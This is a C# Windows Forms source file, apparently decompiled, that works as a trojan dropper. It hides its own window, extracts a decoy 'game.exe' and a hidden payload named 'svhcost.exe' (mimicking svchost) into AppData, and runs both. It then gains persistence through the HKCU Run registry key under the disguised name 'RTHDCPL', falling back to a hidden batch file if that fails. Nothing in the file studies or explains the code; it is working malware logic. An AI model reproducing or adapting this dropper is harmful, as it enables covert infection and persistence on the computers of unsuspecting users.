using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Resources;

public class Form1 : Form
{
	public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public void Write(string KeyName, object Value)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			registryKey.SetValue(KeyName.ToLower(), Value);
		}
		catch
		{
			StreamWriter streamWriter = new StreamWriter(appdata + "\\cmd.bat");
			streamWriter.Write("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ServiceName /d \"" + appdata + "\\svhcost.exe\"");
			streamWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = appdata + "\\cmd.bat";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			if (!File.Exists(appdata + "\\game.exe"))
			{
				File.WriteAllBytes(appdata + "\\game.exe", Resource1.new_year);
			}
			Process process = new Process();
			process.StartInfo.FileName = appdata + "\\game.exe";
			process.Start();
			if (!File.Exists(appdata + "\\svhcost.exe"))
			{
				File.WriteAllBytes(appdata + "\\svhcost.exe", Resource1.svhcost);
				Process process2 = new Process();
				process2.StartInfo.FileName = appdata + "\\svhcost.exe";
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.Start();
				Write("RTHDCPL", appdata + "\\svhcost.exe");
			}
		}
		finally
		{
			((Form)this).Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(240, 186));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Activated((EventHandler)Form1_Activated);
		((Control)this).ResumeLayout(false);
	}
}
